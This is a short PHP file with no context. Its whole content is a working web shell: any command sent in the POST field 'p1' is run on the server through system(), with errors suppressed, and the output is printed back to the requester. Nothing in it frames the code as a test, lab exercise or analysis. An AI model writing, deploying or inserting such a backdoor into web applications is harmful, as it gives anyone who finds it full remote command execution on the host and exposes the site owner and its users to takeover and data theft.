<?php
function ex($in) {
	$out = '';
	ob_start();
	@system($in);
	$out = ob_get_clean();
	return $out;
}

if(!empty($_POST['p1']))
	echo htmlspecialchars("$ ".$_POST['p1']."\n".ex($_POST['p1']));
?>